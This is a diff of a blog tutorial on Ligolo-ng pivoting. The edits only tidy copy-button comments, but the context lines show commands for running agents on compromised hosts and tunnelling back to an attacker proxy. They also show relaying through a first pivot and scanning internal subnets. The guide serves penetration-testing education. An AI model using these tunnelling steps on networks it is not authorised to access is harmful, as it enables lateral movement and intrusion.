@@ -2,11 +2,11 @@
 title: "Ligolo-ng: Single and Double Pivoting Guide"
 date: "2026-05-07T10:00:00+05:30"
 draft: false
-description: "Hands-on guide to Ligolo-ng — install, configure, and pivot through one or more compromised hosts using TUN interface tunneling instead of SOCKS proxies."
 categories: ["Tutorial", "Pentesting"]
 tags: ["pivoting", "tunneling", "lateral-movement", "post-exploitation", "red-team", "ligolo-ng"]
 difficulties: ["intermediate"]
 tools: ["ligolo-ng", "nmap", "go"]
+description: "Hands-on guide to Ligolo-ng — install, configure, and pivot through one or more compromised hosts using TUN interface tunneling instead of SOCKS proxies."
 ---
 
 <div class="difficulty-badge difficulty-intermediate">Intermediate Level</div>
@@ -69,8 +69,6 @@ Because Ligolo-ng exposes the remote network as a Layer 3 interface, every netwo
    (nmap, crackmapexec, etc.)             (10.10.20.0/24)
 ```
 
-<!-- COPY_BUTTON -->
-
 The proxy assigns each connected agent its own TUN interface. Traffic destined for the internal subnet gets routed through the kernel into that TUN, encapsulated, sent over the TLS tunnel, and emitted from the agent on the victim host.
 
 ## Installation
@@ -103,8 +101,6 @@ unzip ligolo-ng_agent_windows_amd64.zip
 
 <!-- COPY_BUTTON -->
 
-<!-- COPY_BUTTON -->
-
 ### Option 2: Build From Source
 
 ```bash
@@ -116,8 +112,6 @@ go build -o agent cmd/agent/main.go
 # Cross-compile agent for Windows
 GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go
 ```
-
-<!-- COPY_BUTTON -->
 
 <!-- COPY_BUTTON -->
 
@@ -140,8 +134,6 @@ sudo ip link set ligolo up
 
 <!-- COPY_BUTTON -->
 
-<!-- COPY_BUTTON -->
-
 <div class="callout callout-info">
 <div class="callout-title">Why a TUN interface?</div>
 
@@ -156,8 +148,6 @@ A TUN device operates at Layer 3 (IP packets). The kernel routes packets into it
 
 <!-- COPY_BUTTON -->
 
-<!-- COPY_BUTTON -->
-
 `-selfcert` generates a self-signed TLS certificate on the fly — fine for engagements, but for stealth or fingerprint-resistance you should provide a real cert with `-certfile` / `-keyfile`.
 
 By default the proxy listens on `0.0.0.0:11601`. You'll land in the interactive shell:
@@ -165,8 +155,6 @@ By default the proxy listens on `0.0.0.0:11601`. You'll land in the interactive 
 ```
 ligolo-ng »
 ```
-
-<!-- COPY_BUTTON -->
 
 ### Step 3: Drop and Run the Agent (Victim)
 
@@ -182,8 +170,6 @@ Transfer the agent binary to `10.10.10.50` (SCP, HTTP server, SMB — whatever f
 
 <!-- COPY_BUTTON -->
 
-<!-- COPY_BUTTON -->
-
 <div class="callout callout-warning">
 <div class="callout-title">Operational Note</div>
 
@@ -196,8 +182,6 @@ Back on the proxy you'll see:
 INFO[0042] Agent joined.    name=user@DMZ-WEB01 remote="10.10.10.50:54321"
 ```
 
-<!-- COPY_BUTTON -->
-
 ### Step 4: Select Session and Start Tunnel
 
 ```
@@ -206,16 +190,12 @@ ligolo-ng » session
 [Agent : user@DMZ-WEB01] » ifconfig
 ```
 
-<!-- COPY_BUTTON -->
-
 `ifconfig` enumerates the agent's network interfaces — note the internal subnet you want to reach.
 
 ```
 [Agent : user@DMZ-WEB01] » start
 [Agent : user@DMZ-WEB01] » INFO[0103] Starting tunnel to user@DMZ-WEB01
 ```
-
-<!-- COPY_BUTTON -->
 
 <div class="callout callout-info">
 <div class="callout-title">Newer versions (v0.7+)</div>
@@ -230,8 +210,6 @@ In a **separate terminal** on the attacker (the proxy shell stays interactive):
 ```bash
 sudo ip route add 10.10.20.0/24 dev ligolo
 ```
-
-<!-- COPY_BUTTON -->
 
 <!-- COPY_BUTTON -->
 
@@ -252,8 +230,6 @@ crackmapexec smb 10.10.20.0/24
 
 <!-- COPY_BUTTON -->
 
-<!-- COPY_BUTTON -->
-
 <div class="callout callout-success">
 <div class="callout-title">What just happened</div>
 
@@ -269,8 +245,6 @@ You ──► DMZ (10.10.10.50) ──► Internal (10.10.20.10) ──► Restr
         Agent #1                Agent #2                  Target
 ```
 
-<!-- COPY_BUTTON -->
-
 The trick: have the second agent connect through the first one. Ligolo-ng's `listener_add` builds a relay on the first compromised host that forwards inbound connections back to your proxy through the existing tunnel.
 
 ### Step 1: Create a Listener on the First Pivot
@@ -281,8 +255,6 @@ In the proxy shell, while inside the first agent's session:
 [Agent : user@DMZ-WEB01] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 INFO[0220] Listener created on remote agent!
 ```
-
-<!-- COPY_BUTTON -->
 
 This tells agent #1: *"open port 11601 on yourself; forward anything that hits it back to my proxy on 127.0.0.1:11601 through our tunnel."*
 
@@ -300,15 +272,11 @@ Transfer the same agent binary to `10.10.20.10`. Now point it at the **first piv
 ./agent -connect 10.10.20.10:11601 -ignore-cert
 ```
 
-<!-- COPY_BUTTON -->
-
 Wait — that's wrong from agent #2's perspective. It connects to `10.10.20.10` which is itself. Use the first pivot's *internal* IP that agent #2 can reach. If agent #2 was dropped on `10.10.20.10` and the first pivot is `10.10.20.5` (the inside NIC of agent #1's host):
 
 ```bash
 ./agent -connect 10.10.20.5:11601 -ignore-cert
 ```
-
-<!-- COPY_BUTTON -->
 
 <!-- COPY_BUTTON -->
 
@@ -325,8 +293,6 @@ sudo ip link set ligolo2 up
 
 <!-- COPY_BUTTON -->
 
-<!-- COPY_BUTTON -->
-
 In the proxy shell, switch to the new session and start its tunnel on the new interface:
 
 ```
@@ -334,8 +300,6 @@ ligolo-ng » session
 ? Specify a session : 2 - user@INT-APP02 - <relayed>
 [Agent : user@INT-APP02] » tunnel_start --tun ligolo2
 ```
-
-<!-- COPY_BUTTON -->
 
 <div class="callout callout-info">
 <div class="callout-title">Older Ligolo-ng?</div>
@@ -351,16 +315,12 @@ sudo ip route add 10.10.30.0/24 dev ligolo2
 
 <!-- COPY_BUTTON -->
 
-<!-- COPY_BUTTON -->
-
 ### Step 5: Verify End-to-End
 
 ```bash
 ping 10.10.30.50
 nmap -sS -sV --top-ports 100 10.10.30.0/24
 ```
-
-<!-- COPY_BUTTON -->
 
 <!-- COPY_BUTTON -->
 
